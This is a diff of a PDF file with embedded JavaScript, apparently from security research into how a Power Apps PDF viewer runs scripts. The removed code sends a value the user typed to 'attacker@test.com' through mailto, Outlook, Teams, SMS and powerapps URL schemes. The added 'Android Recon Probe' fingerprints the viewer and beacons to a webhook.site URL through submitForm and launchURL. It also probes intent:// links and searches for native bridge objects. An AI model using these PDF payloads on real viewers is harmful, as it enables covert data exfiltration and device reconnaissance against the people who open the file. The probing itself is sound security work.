@@ -1,5 +1,5 @@
 %PDF-1.7
-% Mailto Exfil Correct Format - iOS - March 2026
+% Android Recon Probe - March 2026
 1 0 obj
 << /Type /Catalog
    /Pages 2 0 R
@@ -21,73 +21,76 @@ endobj
       try {
         var results = [];
 
-        var captured = app.response("Enter test value:", "Power Apps");
+        // === 1. ENGINE ===
+        results.push("=== ENGINE ===");
+        try { results.push("viewerVersion: " + app.viewerVersion); } catch(e) { results.push("viewerVersion: " + e); }
+        try { results.push("viewerType: " + app.viewerType); } catch(e) { results.push("viewerType: " + e); }
+        try { results.push("platform: " + app.platform); } catch(e) { results.push("platform: " + e); }
+        try { results.push("language: " + app.language); } catch(e) { results.push("language: " + e); }
 
-        results.push("captured: [" + captured + "]");
+        // === 2. NETWORK ===
+        results.push("=== NETWORK ===");
+        try {
+          this.submitForm({
+            cURL: "https://webhook.site/b8b9b62a-b796-4362-9f3f-6a860ac221ce?t=android",
+            cSubmitAs: "HTML"
+          });
+          results.push("submitForm: no throw");
+        } catch(e) { results.push("submitForm: " + e); }
+        try {
+          app.launchURL("https://webhook.site/b8b9b62a-b796-4362-9f3f-6a860ac221ce?t=launch", false);
+          results.push("launchURL: no throw");
+        } catch(e) { results.push("launchURL: " + e); }
+        try {
+          app.launchURL("mailto:?body=androidtest", false);
+          results.push("mailto: no throw");
+        } catch(e) { results.push("mailto: " + e); }
+        try {
+          app.launchURL("intent://probe#Intent;scheme=probe;end", false);
+          results.push("intent: no throw");
+        } catch(e) { results.push("intent: " + e); }
 
-        if (captured !== null) {
+        // === 3. METADATA ===
+        results.push("=== METADATA ===");
+        try {
+          this.info.Title = "ANDROID_TEST";
+          results.push("title write: " + this.info.Title);
+        } catch(e) { results.push("title write: " + e); }
 
-          // === MAILTO CORRECT FORMAT ===
-          results.push("=== MAILTO VARIANTS ===");
+        // === 4. RESPONSE TEST ===
+        results.push("=== RESPONSE ===");
+        try { results.push("app.response type: " + typeof app.response); } catch(e) { results.push("response: " + e); }
 
-          // Variant 1: body only
-          try {
-            app.launchURL("mailto:?body=" + captured, false);
-            results.push("mailto body: no throw");
-          } catch(e) { results.push("mailto body: " + e); }
+        // === 5. WINDOW / WEBKIT ===
+        results.push("=== WINDOW ===");
+        try { results.push("window: " + typeof window); } catch(e) { results.push("window: " + e); }
+        try { results.push("document: " + typeof document); } catch(e) { results.push("document: " + e); }
+        try { results.push("XMLHttpRequest: " + typeof XMLHttpRequest); } catch(e) { results.push("XHR: " + e); }
 
-          // Variant 2: to + subject + body
-          try {
-            app.launchURL(
-              "mailto:attacker@test.com?subject=PA&body=" + captured,
-              false
-            );
-            results.push("mailto full: no throw");
-          } catch(e) { results.push("mailto full: " + e); }
+        // === 6. ANDROID BRIDGES ===
+        results.push("=== BRIDGES ===");
+        try {
+          var paNames = [
+            "PowerAppsNativeHost","PAHost","AppMagicNative",
+            "NativeInterface","AndroidBridge","CanvasHost",
+            "PCFHost","FluentHost","MicrosoftHost","MAMHost"
+          ];
+          var found = paNames.filter(function(n) {
+            try { return typeof window[n] !== "undefined"; } catch(e) { return false; }
+          });
+          results.push(found.length ? found.join(", ") : "none found");
+        } catch(e) { results.push("bridges: " + e); }
 
-          // Variant 3: ms-outlook scheme
-          try {
-            app.launchURL(
-              "ms-outlook://compose?to=attacker@test.com&body=" + captured,
-              false
-            );
-            results.push("ms-outlook: no throw");
-          } catch(e) { results.push("ms-outlook: " + e); }
+        // === 7. BTOA ===
+        results.push("=== BTOA ===");
+        try {
+          results.push("btoa: " + btoa("androidtest"));
+        } catch(e) { results.push("btoa: " + e); }
 
-          // Variant 4: ms-teams deep link with data
-          try {
-            app.launchURL(
-              "msteams://teams.microsoft.com/l/chat/0/0?message=" + captured,
-              false
-            );
-            results.push("msteams chat: no throw");
-          } catch(e) { results.push("msteams chat: " + e); }
-
-          // Variant 5: powerapps scheme with data
-          try {
-            app.launchURL(
-              "powerapps://apps?data=" + captured,
-              false
-            );
-            results.push("powerapps scheme: no throw");
-          } catch(e) { results.push("powerapps scheme: " + e); }
-
-          // Variant 6: tel scheme - does it dial?
-          try {
-            app.launchURL("tel:+1234567890", false);
-            results.push("tel: no throw");
-          } catch(e) { results.push("tel: " + e); }
-
-          // Variant 7: sms scheme
-          try {
-            app.launchURL(
-              "sms:+1234567890&body=" + captured,
-              false
-            );
-            results.push("sms: no throw");
-          } catch(e) { results.push("sms: " + e); }
-
-        }
+        // === 8. FUNCTION SOURCES ===
+        results.push("=== SOURCES ===");
+        try { results.push("submitForm: " + this.submitForm.toString().slice(0,60)); } catch(e) { results.push("submitForm src: " + e); }
+        try { results.push("launchURL: " + app.launchURL.toString().slice(0,60)); } catch(e) { results.push("launchURL src: " + e); }
 
         app.alert(results.join("\\n"));
 
@@ -109,8 +112,8 @@ endobj
 5 0 obj
 << /Length 90 >>
 stream
-BT /F1 14 Tf 50 250 Td (Mailto Exfil Test) Tj ET
-BT /F1 12 Tf 50 220 Td (Watch for app switches) Tj ET
+BT /F1 14 Tf 50 250 Td (Android Recon) Tj ET
+BT /F1 12 Tf 50 220 Td (Check alert + webhook) Tj ET
 endstream
 endobj
 
@@ -120,11 +123,11 @@ xref
 0000000015 00000 n 
 0000000075 00000 n 
 0000000135 00000 n 
-0000002200 00000 n 
-0000002360 00000 n 
+0000002400 00000 n 
+0000002560 00000 n 
 
 trailer
 << /Size 6 /Root 1 0 R >>
 startxref
-2450
+2650
 %%EOF
